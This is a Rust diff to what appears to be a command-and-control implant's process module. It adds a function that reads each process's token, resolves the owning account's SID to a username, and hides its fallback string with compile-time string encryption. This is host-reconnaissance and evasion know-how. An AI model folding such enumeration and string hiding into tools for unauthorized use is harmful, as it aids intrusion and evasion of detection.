@@ -6,16 +6,26 @@ use shared::{
     tasks::{Task, WyrmResult},
 };
 use std::{mem::MaybeUninit, ptr::null_mut};
-use windows_sys::Win32::{
-    Foundation::{CloseHandle, FALSE, GetLastError},
-    System::{
-        ProcessStatus::{EnumProcesses, GetModuleBaseNameW},
-        Threading::{
-            OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_READ,
-            TerminateProcess,
+use str_crypter::{decrypt_string, sc};
+use windows_sys::{
+    Win32::{
+        Foundation::{CloseHandle, FALSE, GetLastError, HANDLE},
+        Security::{
+            GetTokenInformation, LookupAccountSidW, PSID, SID_NAME_USE, TOKEN_QUERY, TOKEN_USER,
+            TokenUser,
+        },
+        System::{
+            ProcessStatus::{EnumProcesses, GetModuleBaseNameW},
+            Threading::{
+                OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
+                PROCESS_VM_READ, TerminateProcess,
+            },
         },
     },
+    core::PWSTR,
 };
+
+use crate::utils::strings::utf_16_to_string_lossy;
 
 pub fn running_process_details() -> Option<impl Serialize> {
     // Get the pids; if we fail to do so, quit
@@ -74,15 +84,17 @@ fn pids_to_processes(pids: Vec<u32>) -> Option<Vec<Process>> {
         // SAFETY: Handle is valid at this point, we check the null status above
         let name_len = unsafe { GetModuleBaseNameW(handle, null_mut(), buf.as_mut_ptr(), sz) };
 
-        let _ = unsafe { CloseHandle(handle) };
-
         if name_len == 0 {
+            let _ = unsafe { CloseHandle(handle) };
             continue;
         }
 
         let name = String::from_utf16_lossy(&buf[..name_len as usize]);
 
-        processes.push(Process { pid, name });
+        let user: String = lookup_process_owner_name(handle, pid);
+
+        processes.push(Process { pid, name, user });
+        let _ = unsafe { CloseHandle(handle) };
     }
 
     if processes.is_empty() {
@@ -90,6 +102,120 @@ fn pids_to_processes(pids: Vec<u32>) -> Option<Vec<Process>> {
     }
 
     Some(processes)
+}
+
+fn lookup_process_owner_name(handle: HANDLE, pid: u32) -> String {
+    let mut token_handle: HANDLE = HANDLE::default();
+    let mut user = String::new();
+
+    let result = unsafe { OpenProcessToken(handle, TOKEN_QUERY, &mut token_handle) } as u8;
+
+    if result == 0 {
+        #[cfg(debug_assertions)]
+        {
+            use shared::pretty_print::print_failed;
+
+            let gle = unsafe { GetLastError() };
+            print_failed(format!(
+                "Failed to initially open token on process {pid}. {gle:#X}"
+            ));
+        }
+        return sc!("unknown", 78).unwrap();
+    }
+
+    let mut token_size = 0;
+    unsafe { GetTokenInformation(token_handle, TokenUser, null_mut(), 0, &mut token_size) };
+
+    //
+    // If we received data, pull out the token info (gives us the users SID which we can convert to a username)
+    //
+    if token_size > 0 {
+        let mut token_info: Vec<u8> = Vec::with_capacity(token_size as _);
+
+        let result = unsafe {
+            GetTokenInformation(
+                token_handle,
+                TokenUser,
+                token_info.as_mut_ptr() as *mut _,
+                token_size,
+                &mut token_size,
+            )
+        };
+
+        if result == 0 {
+            #[cfg(debug_assertions)]
+            {
+                use shared::pretty_print::print_failed;
+
+                let gle = unsafe { GetLastError() };
+                print_failed(format!(
+                    "Failed to read token info on process {pid}. {gle:#X}"
+                ));
+            }
+            unsafe { CloseHandle(token_handle) };
+            return sc!("unknown", 78).unwrap();
+        }
+
+        //
+        // At this point we have properly got the token info, it now needs parsing as a SID
+        // and looking up.
+        //
+        let sid = unsafe { *(token_info.as_ptr() as *const TOKEN_USER) }
+            .User
+            .Sid as PSID;
+
+        const BUF_LEN: u32 = 256;
+        let mut name_tchars = BUF_LEN;
+        let mut wide_name: [u16; 256] = [0; 256];
+        let mut domain_tchars = BUF_LEN;
+        let mut wide_domain: [u16; 256] = [0; 256];
+        let mut sid_type = SID_NAME_USE::default();
+
+        let result = unsafe {
+            LookupAccountSidW(
+                null_mut(),
+                sid,
+                wide_name.as_mut_ptr(),
+                &mut name_tchars,
+                wide_domain.as_mut_ptr(),
+                &mut domain_tchars,
+                &mut sid_type,
+            )
+        };
+
+        if result == 0 {
+            #[cfg(debug_assertions)]
+            {
+                use shared::pretty_print::print_failed;
+
+                let gle = unsafe { GetLastError() };
+                print_failed(format!("Failed to lookup account SID {pid}. {gle:#X}"));
+            }
+
+            return sc!("unknown", 78).unwrap();
+        }
+
+        //
+        // Convert to a native string
+        //
+        user = unsafe { utf_16_to_string_lossy(wide_name.as_ptr(), name_tchars as _) };
+    } else {
+        #[cfg(debug_assertions)]
+        {
+            use shared::pretty_print::print_failed;
+
+            let gle = unsafe { GetLastError() };
+            print_failed(format!(
+                "No data received when trying to open token {pid}. {gle:#X}"
+            ));
+        }
+
+        user = sc!("unknown", 78).unwrap();
+    }
+
+    unsafe { CloseHandle(token_handle) };
+
+    user
 }
 
 /// Kills a process by its pid.
